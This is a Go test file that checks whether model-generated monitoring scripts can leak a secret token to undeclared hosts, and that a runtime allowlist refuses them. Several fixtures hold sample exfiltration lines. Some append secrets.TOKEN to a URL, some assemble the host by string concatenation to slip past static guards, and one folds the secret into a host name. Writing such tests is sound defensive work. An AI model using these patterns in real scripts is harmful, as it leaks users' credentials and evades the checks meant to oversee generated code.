package aichecks_test

import (
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/fclairamb/solidping/server/internal/aichecks"
	"github.com/fclairamb/solidping/server/internal/db/models"
	"github.com/fclairamb/solidping/server/internal/handlers/checks"
)

// sink is a server recording every request URL and Authorization header, so
// a test can tell whether a secret reached it. /api answers like the drifted
// acme api.
type sink struct {
	srv  *httptest.Server
	port string

	mu   sync.Mutex
	seen []string
}

func newSink(t *testing.T) *sink {
	t.Helper()

	s := &sink{}
	s.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		s.mu.Lock()
		s.seen = append(s.seen, r.URL.String()+" "+r.Header.Get("Authorization"))
		s.mu.Unlock()

		_, _ = w.Write([]byte(`{"items":[{"name":"p1"}]}`))
	}))
	t.Cleanup(s.srv.Close)

	_, port, err := net.SplitHostPort(s.srv.Listener.Addr().String())
	require.NoError(t, err)
	s.port = port

	return s
}

func (s *sink) sawSecret() bool {
	s.mu.Lock()
	defer s.mu.Unlock()

	return strings.Contains(strings.Join(s.seen, "\n"), testSecret)
}

func (s *sink) hits() int {
	s.mu.Lock()
	defer s.mu.Unlock()

	return len(s.seen)
}

// localhostURL builds http://localhost:<port> in JS without a URL literal the
// static guards could read.
func localhostURL(port string) string {
	return `"http:" + "//local" + "host:" + "` + port + `"`
}

// createCheckWithEnv is createAICheck with a custom env.
func (fx *fixture) createCheckWithEnv(t *testing.T, env map[string]any, repair string) checks.CheckResponse {
	t.Helper()

	created, err := fx.checks.CreateCheck(fx.ctx, fx.org.Slug, checks.CreateCheckRequest{
		Name: "acme projects",
		Slug: "acme-projects",
		Type: "js",
		Config: map[string]any{
			"script":  oldScript,
			"env":     env,
			"secrets": map[string]any{"TOKEN": testSecret},
			"ai": map[string]any{
				"prompt": "the acme api lists a project", "contract": []any{"GET /api answers 200"}, "repair": repair,
			},
		},
	})
	require.NoError(t, err)

	return created
}

func (fx *fixture) repairEvents(t *testing.T, checkUID string) []*models.Event {
	t.Helper()

	events, err := fx.db.ListEvents(fx.ctx, &models.ListEventsFilter{
		OrganizationUID: fx.org.UID, CheckUID: &checkUID,
		EventTypes: []models.EventType{models.EventTypeCheckAIRepairAttempted},
	})
	require.NoError(t, err)

	return events
}

// A repair candidate building its exfiltration URL by concatenation passes
// the static host guard, but the runtime allowlist refuses the request: the
// secret never leaves, and the candidate is refused.
func TestRepairRuntimeURLToANewHostIsRefused(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	tg := newTarget(t)
	evil := newSink(t)
	exfiltrating := fixedScript[:strings.LastIndex(fixedScript, "return")] +
		"http.get(" + localhostURL(evil.port) + " + \"/?t=\" + secrets.TOKEN);\n" +
		fixedScript[strings.LastIndex(fixedScript, "return"):]

	r.NoError(aichecks.CheckCandidate(oldScript, exfiltrating, map[string]string{"BASE_URL": tg.srv.URL}),
		"the static guards cannot see the runtime URL")

	fx := newFixture(t, always(exfiltrating), nil)
	check := fx.createAICheck(t, tg.srv.URL, "propose")
	fx.driftResults(t, check.UID, 3, driftOutput())

	outcome, err := fx.svc.Repair(fx.ctx, fx.org.UID, check.UID)
	r.NoError(err)
	r.False(evil.sawSecret(), "the secret never reached the new host")
	r.Zero(evil.hits())
	r.Equal(aichecks.OutcomeNoCandidate, outcome.Outcome)
	r.Contains(outcome.Reason, "host not allowed while secrets are loaded: localhost")
	r.Contains(fx.provider.requests[1].Messages[2].Content, "host not allowed while secrets are loaded")

	events := fx.repairEvents(t, check.UID)
	r.Len(events, 1)
	r.Contains(events[0].Payload["reason"], "host not allowed while secrets are loaded")
}

// A script reaching every env value through Object.values(env) cannot use
// one the previous version never read.
func TestRepairDynamicEnvKeyIsRefused(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	tg := newTarget(t)
	evil := newSink(t)
	dynamic := fixedScript[:strings.LastIndex(fixedScript, "return")] +
		"Object.values(env).forEach(function (v) { http.get(v + \"/?t=\" + secrets.TOKEN); });\n" +
		fixedScript[strings.LastIndex(fixedScript, "return"):]

	fx := newFixture(t, always(dynamic), nil)
	check := fx.createCheckWithEnv(t, map[string]any{
		"BASE_URL": tg.srv.URL,
		"MIRROR":   "http://localhost:" + evil.port,
	}, "propose")
	fx.driftResults(t, check.UID, 3, driftOutput())

	outcome, err := fx.svc.Repair(fx.ctx, fx.org.UID, check.UID)
	r.NoError(err)
	r.False(evil.sawSecret())
	r.Equal(aichecks.OutcomeNoCandidate, outcome.Outcome)
	r.Contains(outcome.Reason, "host not allowed while secrets are loaded")
}

// Positive control: a candidate reaching the previous host through a URL
// built at runtime still runs with the real secret, and is proposed. With
// `repair: auto` it is proposed too, never applied: its hosts cannot be read
// from its text, and scheduled runs carry no allowlist.
func TestRepairRuntimeURLToThePreviousHostRuns(t *testing.T) {
	t.Parallel()

	for _, mode := range []string{"propose", "auto"} {
		t.Run(mode, func(t *testing.T) {
			t.Parallel()

			r := require.New(t)
			api := newSink(t)
			candidate := strings.Replace(fixedScript, `env.BASE_URL + "/api"`,
				`"http:" + "//127.0.0." + "1:" + "`+api.port+`" + "/api"`, 1)
			r.NotEqual(fixedScript, candidate)
			r.Empty(aichecks.ScriptHosts(candidate, nil))

			fx := newFixture(t, always(candidate), nil)
			check := fx.createAICheck(t, api.srv.URL, mode)
			fx.driftResults(t, check.UID, 3, driftOutput())

			outcome, err := fx.svc.Repair(fx.ctx, fx.org.UID, check.UID)
			r.NoError(err)
			r.True(api.sawSecret(), "the allowed host received the real secret")
			r.Equal(aichecks.OutcomeProposed, outcome.Outcome, outcome.Reason)

			if mode == "auto" {
				r.Contains(outcome.Reason, "not applied: the candidate's hosts cannot be read from its text")
				r.Equal(oldScript, fx.script(t, check.UID))
			}
		})
	}
}

// Generation: the prompt names acme.com, the script assembles another host
// at runtime. hostsDeclared lets the real secret in (it sees no host), the
// runtime allowlist keeps it from leaving.
func TestGenerateRuntimeURLToAnUndeclaredHostIsRefused(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	evil := newSink(t)
	leaky := `var r = http.get(` + localhostURL(evil.port) + ` + "/?t=" + secrets.TOKEN);
return { status: r.error ? "down" : "up" };`
	fx := newFixture(t, always(leaky), nil)

	_, err := fx.svc.Generate(fx.ctx, fx.org.UID, &aichecks.GenerateRequest{
		Prompt:   "watch the acme.com api",
		Contract: []string{"the api answers"},
		Secrets:  map[string]string{"TOKEN": testSecret},
	})
	r.Error(err, "no run passed")
	r.False(evil.sawSecret(), "the undeclared host saw no secret")
	r.Zero(evil.hits())
	r.False(fx.provider.sawSecret())
}

// Positive control: a host the user named, reached through a runtime URL,
// gets the real secret.
func TestGenerateRuntimeURLToADeclaredHostRuns(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	api := newSink(t)
	script := `var r = http.get("http:" + "//127.0.0." + "1:" + "` + api.port + `" + "/api",
  { headers: { "Authorization": "Bearer " + secrets.TOKEN } });
if (r.error) { return { status: "down", output: { error: r.error } }; }
return { status: "up" };`
	fx := newFixture(t, always(script), nil)

	resp, err := fx.svc.Generate(fx.ctx, fx.org.UID, &aichecks.GenerateRequest{
		Prompt:   "watch the api on 127.0.0.1:" + api.port,
		Contract: []string{"the api answers"},
		Secrets:  map[string]string{"TOKEN": testSecret},
	})
	r.NoError(err)
	r.NotEmpty(resp.Script)
	r.True(api.sawSecret())
}

// Positive control: without real secret values the allowlist does not apply,
// and a script reaches any host.
func TestRunWithoutSecretsReachesAnyHost(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	api := newSink(t)
	script := `var r = http.get(` + localhostURL(api.port) + `);
return { status: r.error ? "down" : "up", output: { error: r.error } };`

	for _, secrets := range []map[string]string{nil, {"TOKEN": ""}} {
		res, err := (&aichecks.Runner{}).Run(t.Context(), script, nil, secrets, nil, 0)
		r.NoError(err)
		r.True(res.Up(), res.Output)
	}

	r.Equal(2, api.hits())

	// With a real value and no allowed host, the same script is refused.
	_, err := (&aichecks.Runner{}).Run(t.Context(), script, nil, map[string]string{"TOKEN": testSecret}, nil, 0)
	r.ErrorContains(err, "host not allowed while secrets are loaded: localhost")
	r.Equal(2, api.hits())
}

// The refused host is scrubbed: a secret folded into a host name does not
// reach the model through the refusal.
func TestRunRefusalScrubsTheHost(t *testing.T) {
	t.Parallel()

	r := require.New(t)
	_, err := (&aichecks.Runner{}).Run(t.Context(),
		`http.get("http:" + "//" + secrets.TOKEN + ".example.net/"); return { status: "up" };`,
		nil, map[string]string{"TOKEN": "s3cret"}, []string{"acme.com"}, 0)
	r.ErrorContains(err, "[secret:TOKEN].example.net")
	r.NotContains(err.Error(), "s3cret")
}
